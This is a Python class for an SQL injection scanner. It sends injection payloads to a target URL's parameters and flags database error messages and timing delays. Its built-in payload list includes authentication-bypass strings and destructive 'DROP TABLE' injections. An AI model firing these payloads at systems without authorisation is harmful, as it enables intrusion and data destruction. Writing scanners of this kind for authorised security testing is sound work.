import requests
from urllib.parse import urljoin, urlparse, parse_qs
import re
import time

class SQLScanner:
    def __init__(self, session, timeout):
        self.session = session
        self.timeout = timeout
        self.payloads = self._load_payloads()
        self.error_patterns = self._get_error_patterns()
    
    def _load_payloads(self):
        """Load SQL injection payloads from file"""
        try:
            with open('data/sql_payloads.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            # Return basic SQL injection payloads if file doesn't exist
            return [
                "'", '"', "1'", '1"', "1' OR '1'='1", '1" OR "1"="1',
                "1' OR '1'='1'--", '1" OR "1"="1"--', "1' OR '1'='1'#",
                '1" OR "1"="1"#', "1' UNION SELECT NULL--", 
                '1" UNION SELECT NULL--', "1' AND '1'='2", '1" AND "1"="2',
                "1' WAITFOR DELAY '0:0:5'--", "1'; WAITFOR DELAY '0:0:5'--",
                "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
                "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
                "1' AND (SELECT COUNT(*) FROM mysql.user)>0--",
                "1' OR SLEEP(5)--", "1' OR pg_sleep(5)--",
                "1' OR BENCHMARK(5000000,MD5(1))--",
                "1' OR (SELECT * FROM (SELECT(SLEEP(5)))test)--",
                "1'; DROP TABLE test--", "1\"; DROP TABLE test--",
                "1' OR 1=1--", '1" OR 1=1--', "admin'--", 'admin"--',
                "' OR '1'='1' /*", '" OR "1"="1" /*'
            ]
    
    def _get_error_patterns(self):
        """Get SQL error patterns for different databases"""
        return {
            'mysql': [
                r'You have an error in your SQL syntax',
                r'mysql_fetch_array\(\)',
                r'mysql_fetch_row\(\)',
                r'mysql_fetch_assoc\(\)',
                r'mysql_num_rows\(\)',
                r'Warning.*mysql_.*',
                r'MySQL server version',
                r'MySQLSyntaxErrorException'
            ],
            'postgresql': [
                r'PostgreSQL.*ERROR',
                r'Warning.*pg_.*',
                r'valid PostgreSQL result',
                r'Npgsql\.',
                r'PG::SyntaxError',
                r'psql.*ERROR',
                r'PSQLException'
            ],
            'mssql': [
                r'Microsoft.*ODBC.*SQL Server',
                r'Unclosed quotation mark after the character string',
                r'Microsoft OLE DB Provider for ODBC Drivers',
                r'Microsoft JET Database Engine',
                r'SQLServer JDBC Driver',
                r'SqlException',
                r'System.Data.SqlClient.SqlException'
            ],
            'oracle': [
                r'ORA-[0-9]{5}',
                r'Oracle.*Driver',
                r'Oracle.*Error',
                r'OracleException',
                r'oracle\.jdbc\.driver'
            ],
            'sqlite': [
                r'SQLite.*error',
                r'sqlite3\.OperationalError',
                r'SQLite3::SQLException'
            ]
        }
    
    def scan(self, target_url):
        """Scan for SQL injection vulnerabilities"""
        findings = []
        
        try:
            # Get the main page to find forms and parameters
            response = self.session.get(target_url, timeout=self.timeout)
            
            # Test URL parameters for SQL injection
            url_findings = self._test_url_parameters(target_url)
            findings.extend(url_findings)
            
            # Test for error-based SQL injection
            error_findings = self._test_error_based_sqli(target_url)
            findings.extend(error_findings)
            
            # Test for time-based SQL injection
            time_findings = self._test_time_based_sqli(target_url)
            findings.extend(time_findings)
            
        except requests.exceptions.RequestException as e:
            findings.append({
                'title': 'SQL Injection Scan Failed',
                'description': f'Unable to perform SQL injection scan: {str(e)}',
                'severity': 'info',
                'details': str(e)
            })
        
        return findings
    
    def _test_url_parameters(self, target_url):
        """Test URL parameters for SQL injection"""
        findings = []
        
        try:
            # Parse URL for existing parameters
            parsed_url = urlparse(target_url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                # Try common parameter names
                common_params = ['id', 'user', 'page', 'category', 'product', 'search', 'q']
                for param in common_params:
                    param_findings = self._test_parameter_sqli(target_url, param)
                    findings.extend(param_findings)
            else:
                # Test existing parameters
                for param in params:
                    param_findings = self._test_parameter_sqli(target_url, param)
                    findings.extend(param_findings)
        
        except Exception:
            pass
        
        return findings
    
    def _test_parameter_sqli(self, target_url, param_name):
        """Test a specific parameter for SQL injection"""
        findings = []
        
        try:
            # Test with basic SQL injection payloads
            for payload in self.payloads[:5]:  # Test first 5 payloads
                test_params = {param_name: payload}
                response = self.session.get(target_url, params=test_params, timeout=self.timeout)
                
                # Check for SQL errors
                db_type, error_found = self._check_sql_errors(response.text)
                if error_found:
                    findings.append({
                        'title': f'SQL Injection Vulnerability in Parameter: {param_name}',
                        'description': f'Parameter {param_name} is vulnerable to SQL injection',
                        'severity': 'high',
                        'details': f'Database: {db_type}, Payload: {payload}, Parameter: {param_name}'
                    })
                    break  # Found vulnerability, no need to test more payloads
        
        except requests.exceptions.RequestException:
            pass
        
        return findings
    
    def _test_error_based_sqli(self, target_url):
        """Test for error-based SQL injection"""
        findings = []
        
        try:
            # Test with error-inducing payloads
            error_payloads = ["'", '"', "1'", '1"', "1' AND 1=2--"]
            
            for payload in error_payloads:
                test_params = {'test': payload}
                response = self.session.get(target_url, params=test_params, timeout=self.timeout)
                
                db_type, error_found = self._check_sql_errors(response.text)
                if error_found:
                    findings.append({
                        'title': 'Error-Based SQL Injection Vulnerability',
                        'description': 'The application reveals database errors that indicate SQL injection vulnerability',
                        'severity': 'high',
                        'details': f'Database: {db_type}, Error-inducing payload: {payload}'
                    })
                    break  # Found vulnerability
        
        except requests.exceptions.RequestException:
            pass
        
        return findings
    
    def _test_time_based_sqli(self, target_url):
        """Test for time-based SQL injection"""
        findings = []
        
        try:
            # Test with time-based payloads
            time_payloads = [
                "1' OR SLEEP(5)--",
                "1' OR pg_sleep(5)--",
                "1' WAITFOR DELAY '0:0:5'--",
                "1' OR BENCHMARK(5000000,MD5(1))--"
            ]
            
            # Get baseline response time
            start_time = time.time()
            response = self.session.get(target_url, timeout=self.timeout)
            baseline_time = time.time() - start_time
            
            for payload in time_payloads:
                test_params = {'test': payload}
                
                start_time = time.time()
                try:
                    response = self.session.get(target_url, params=test_params, timeout=self.timeout + 10)
                    response_time = time.time() - start_time
                    
                    # Check if response time is significantly longer
                    if response_time > baseline_time + 4:  # 4 second delay threshold
                        findings.append({
                            'title': 'Time-Based SQL Injection Vulnerability',
                            'description': 'The application is vulnerable to time-based SQL injection attacks',
                            'severity': 'high',
                            'details': f'Response time: {response_time:.2f}s, Baseline: {baseline_time:.2f}s, Payload: {payload}'
                        })
                        break  # Found vulnerability
                
                except requests.exceptions.Timeout:
                    # Timeout might indicate successful time-based injection
                    findings.append({
                        'title': 'Potential Time-Based SQL Injection',
                        'description': 'Request timed out, which may indicate time-based SQL injection',
                        'severity': 'medium',
                        'details': f'Timeout with payload: {payload}'
                    })
                    break
        
        except requests.exceptions.RequestException:
            pass
        
        return findings
    
    def _check_sql_errors(self, response_text):
        """Check response for SQL error patterns"""
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return db_type, True
        return 'unknown', False
